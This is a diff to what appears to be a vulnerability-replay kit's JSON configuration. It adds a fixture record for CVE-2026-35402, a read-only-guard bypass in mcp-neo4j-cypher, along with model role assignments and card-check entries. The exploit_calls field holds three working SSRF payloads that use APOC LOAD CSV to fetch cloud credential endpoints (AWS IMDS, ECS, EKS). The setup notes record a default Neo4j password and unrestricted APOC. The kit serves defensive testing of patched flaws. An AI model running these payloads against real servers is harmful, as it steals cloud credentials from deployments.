@@ -1800,6 +1800,24 @@
       "scope": "CVE-2026-46514",
       "model": "claude-opus-5-5",
       "fallback_model": "claude-opus-4-8"
+    },
+    {
+      "role": "calibrator",
+      "scope": "CVE-2026-35402",
+      "model": "claude-opus-5-5",
+      "fallback_model": "claude-opus-4-8"
+    },
+    {
+      "role": "calibrator",
+      "scope": "CVE-2026-35402",
+      "model": "claude-opus-5-5",
+      "fallback_model": "claude-opus-4-8"
+    },
+    {
+      "role": "card_checker",
+      "scope": "CVE-2026-35402",
+      "model": "claude-opus-5-5",
+      "fallback_model": "claude-opus-4-8"
     }
   ],
   "prefilter": [
@@ -147445,6 +147463,149 @@
         "benign_call": "fm_ami_command {command:'core show version'}",
         "patched_result": "On 1.6.2 every dialplan template implements validateParams()/rejectDangerous() (GHSA-pxfc-q72v-jh8m), which rejects the newline in the injected template parameter, so fm_dialplan_apply returns an error, no hint is planted, and the fm_ami_command readback shows no such extension: no nonce surfaces for any place. The benign call returns the version with no error. The pinned patched version is 1.6.2 rather than the first fixed 1.6.1: the advisories GHSA-3p65-2prr-cfvf and GHSA-pxfc-q72v-jh8m both give the patched version as 1.6.2, and the 1.6.1 install aborts (its install.php regressor leaves the module Disabled; Pending upgrade), so 1.6.2 is the first fixed version that runs as a fixture. 1.6.1 and 1.6.2 carry the same four fixes, so the replay result is unchanged.",
         "attempts": 2
+      },
+      {
+        "flaw": "CVE-2026-35402",
+        "mechanism": "In mcp-neo4j-cypher before 0.6.0 the read tool's write-query check is a keyword regex (MERGE|CREATE|INSERT|SET|DELETE|REMOVE|ADD); a Cypher CALL of an APOC procedure contains none of those keywords and so bypasses the check, letting a read call run side-effecting procedures. Through this the server can be made to fetch an attacker-chosen internal URL (server-side request forgery) and return the body. 0.6.0 replaces the regex with an EXPLAIN-based query-type check.",
+        "effect_class": "internal_fetch",
+        "siblings": [],
+        "kept": [
+          {
+            "place_id": "imds",
+            "reason": "Reached only by exploit call 1, which bypasses the read guard to make Neo4j fetch this endpoint and return its body; the launch and the benign call never contact it. Its nonce surfaces on the vulnerable version and not on the patched one."
+          },
+          {
+            "place_id": "ecs-task-credentials",
+            "reason": "Reached only by exploit call 2, same mechanism as the other kept endpoints; the launch and the benign call never contact it. Its nonce surfaces on the vulnerable version and not on the patched one."
+          },
+          {
+            "place_id": "eks-pod-identity",
+            "reason": "Reached only by exploit call 3, same mechanism as the other kept endpoints; the launch and the benign call never contact it. Its nonce surfaces on the vulnerable version and not on the patched one."
+          }
+        ],
+        "unkept": [
+          {
+            "place_id": "docker-daemon-api",
+            "reason": "In the flaw's reach (internal_fetch) but kind 'unplaceable' in holdout_places.json: the kit can plant no sentinel for it (no fixed servable address), so it cannot be reproduced in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "k8s-api-server",
+            "reason": "In the flaw's reach (internal_fetch) but kind 'unplaceable' in holdout_places.json: the kit can plant no sentinel for it, so it cannot be reproduced in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "loopback-service",
+            "reason": "In the flaw's reach (internal_fetch) but kind 'unplaceable' in holdout_places.json: the kit can plant no sentinel for it, so it cannot be reproduced in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "private-range-service",
+            "reason": "In the flaw's reach (internal_fetch) but kind 'unplaceable' in holdout_places.json: the kit can plant no sentinel for it, so it cannot be reproduced in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "bare-remote-url",
+            "reason": "Outside the flaw's reach (arbitrary_read only; the flaw is internal_fetch). Layout place: the layout check and route check run in the repository, where the maintainer decides it.",
+            "route_checked": false
+          },
+          {
+            "place_id": "bare-history-env",
+            "reason": "Outside the flaw's reach (arbitrary_read only; the flaw is internal_fetch). Layout place: the layout check and route check run in the repository, where the maintainer decides it.",
+            "route_checked": false
+          },
+          {
+            "place_id": "workspace-dotenv",
+            "reason": "Outside the flaw's reach (arbitrary_read only; the flaw is internal_fetch). Layout place: the layout check and route check run in the repository, where the maintainer decides it.",
+            "route_checked": false
+          }
+        ],
+        "launch_options": [
+          {
+            "option": "--read-only",
+            "value": "true",
+            "reason": "The published flaw is a bypass of the server's read-only mode, so the target runs with read-only enabled, the configuration the flaw is defined against (this also unregisters write_neo4j_cypher). The read-query guard the flaw evades is active regardless of this flag, so the exploit does not otherwise depend on it.",
+            "documentation": "mcp-neo4j-cypher argparse: \"--read-only\" help \"Allow only read-only queries (default: False)\"."
+          }
+        ],
+        "seeded_in_layout": [],
+        "seeded_outside_layout": [
+          {
+            "item": "Neo4j graph database server 5.26.1, installed in the server image and started by the image entrypoint before the MCP server; the server connects to it over Bolt (NEO4J_URI bolt://localhost:7687).",
+            "reason": "The server has no function without a Neo4j instance to query; the real software the target calls runs in the container (a stand-in is forbidden since the flaw needs Neo4j to execute the CALL procedure that performs the fetch).",
+            "returned_by": [],
+            "used_by_default_by": [
+              "read_neo4j_cypher",
+              "get_neo4j_schema"
+            ]
+          },
+          {
+            "item": "APOC core plugin (apoc-*-core.jar bundled in the neo4j:5.26.1 image) copied into Neo4j's plugins directory.",
+            "reason": "The server documents APOC as a prerequisite (get_neo4j_schema calls apoc.meta.schema), and the flaw is reached through a CALL of an APOC procedure (apoc.cypher.doIt).",
+            "returned_by": [],
+            "used_by_default_by": [
+              "get_neo4j_schema"
+            ]
+          },
+          {
+            "item": "Neo4j setting dbms.security.procedures.unrestricted=apoc.* in neo4j.conf.",
+            "reason": "APOC procedures reached through the flaw run under Neo4j's procedure sandbox; unrestricting apoc.* is what the flaw needs to invoke them.",
+            "returned_by": [],
+            "used_by_default_by": []
+          },
+          {
+            "item": "Neo4j resource/thread settings in neo4j.conf: server.memory.heap.initial_size=512m, server.memory.heap.max_size=512m, server.memory.pagecache.size=100m, server.http.enabled=false, server.https.enabled=false, server.jvm.additional=-XX:ActiveProcessorCount=2.",
+            "reason": "Only to make the JVM fit the kit's container confinement (pids-limit 256, dropped capabilities); none change which Cypher calls succeed or fail. HTTP/HTTPS connectors are off because the MCP server uses Bolt only.",
+            "returned_by": [],
+            "used_by_default_by": []
+          },
+          {
+            "item": "Neo4j initial password set to 'password' (neo4j-admin dbms set-initial-password) and ENV NEO4J_URI=bolt://localhost:7687, NEO4J_USERNAME=neo4j, NEO4J_PASSWORD=password, NEO4J_DATABASE=neo4j.",
+            "reason": "The server's own documented default connection settings; kept at their defaults so the server connects to the bundled Neo4j.",
+            "returned_by": [],
+            "used_by_default_by": [
+              "read_neo4j_cypher",
+              "get_neo4j_schema"
+            ]
+          },
+          {
+            "item": "uv (astral-sh) tool installer plus a managed standalone CPython 3.12 used to install and run the pinned server, installed world-readable under /opt/uv with the console script on PATH.",
+            "reason": "The documented launch method is uvx/uv; the neo4j:5.26.1 base ships only Python 3.9 (below the server's requires-python >=3.10), so uv provides the pinned interpreter. No effect on tool behaviour.",
+            "returned_by": [],
+            "used_by_default_by": []
+          },
+          {
+            "item": "Image entrypoint that starts 'neo4j console' in the background (logs to a file, off the MCP stdio stream), waits for Bolt, then execs 'mcp-neo4j-cypher --transport stdio --read-only'.",
+            "reason": "The deployment runs the real Neo4j and the MCP server in one container so Neo4j shares the launch's network namespace and its APOC fetch can reach the internal endpoints; the launch command is the server's documented stdio invocation.",
+            "returned_by": [],
+            "used_by_default_by": []
+          }
+        ],
+        "stand_ins": [],
+        "software_releases": [
+          {
+            "software": "Neo4j",
+            "release": "5.26.1",
+            "day": null,
+            "source": "mcp-neo4j-cypher README Docker Compose example: 'image: neo4j:5.26.1' with NEO4J_PLUGINS=[\"apoc\"]."
+          },
+          {
+            "software": "APOC Core (Neo4j plugin)",
+            "release": "5.26.1",
+            "day": null,
+            "source": "mcp-neo4j-cypher README lists APOC as a prerequisite (NEO4J_PLUGINS=[\"apoc\"]) without naming a version; the fixture copies the apoc-*-core.jar bundled under /var/lib/neo4j/labs in the pinned neo4j:5.26.1 image (docker/Dockerfile.neo4j-cypher), so the release is fixed by that image: APOC Core ships at the matching Neo4j version (apoc-5.26.1-core.jar; neo4j/apoc release tag 5.26.1 on github.com/neo4j/apoc/releases). Determined by the pinned image, so day is null."
+          }
+        ],
+        "fallback_scope": null,
+        "fallback_documentation": null,
+        "exploit_calls": [
+          "read_neo4j_cypher(query=\"CALL apoc.cypher.doIt(\"LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS row RETURN row\", {}) YIELD value RETURN value\")",
+          "read_neo4j_cypher(query=\"CALL apoc.cypher.doIt(\"LOAD CSV FROM 'http://169.254.170.2/v2/credentials/' AS row RETURN row\", {}) YIELD value RETURN value\")",
+          "read_neo4j_cypher(query=\"CALL apoc.cypher.doIt(\"LOAD CSV FROM 'http://169.254.170.23/v1/credentials' AS row RETURN row\", {}) YIELD value RETURN value\")"
+        ],
+        "benign_call": "read_neo4j_cypher(query=\"RETURN 1 AS n\")",
+        "patched_result": "On 0.6.0 each exploit call is rejected by read_neo4j_cypher's EXPLAIN-based write check: EXPLAIN of the apoc.cypher.doIt query reports query_type 'rw', so the server raises before executing and no nonce surfaces. The benign call (RETURN 1) returns normally with no error.",
+        "attempts": 1
       }
     ],
     "card_checks": [
@@ -147624,6 +147785,12 @@
           "Minor: MariaDB and Apache/PHP are absent from software_releases. The server calls the FreePBX ajax endpoint (Apache/PHP) backed by MariaDB, but the documentation names only FreePBX and Asterisk, so the omission is defensible, left to the maintainer's reading of whether MariaDB counts as a \"called\" piece of real software.",
           "Minor: keeping container-hostname rather than imds/ecs/eks is a real mutual exclusion (the holder's --hostname applies to the holder, not the target), its reason stated in full; a calibration decision, not a fidelity gap."
         ],
+        "confirmed_gaps": [],
+        "rule_version": 11
+      },
+      {
+        "flaw": "CVE-2026-35402",
+        "reported_gaps": [],
         "confirmed_gaps": [],
         "rule_version": 11
       }
@@ -148366,7 +148533,8 @@
       "CVE-2026-3484",
       "CVE-2026-3680",
       "CVE-2026-82112",
-      "CVE-2026-46514"
+      "CVE-2026-46514",
+      "CVE-2026-35402"
     ]
   }
 }
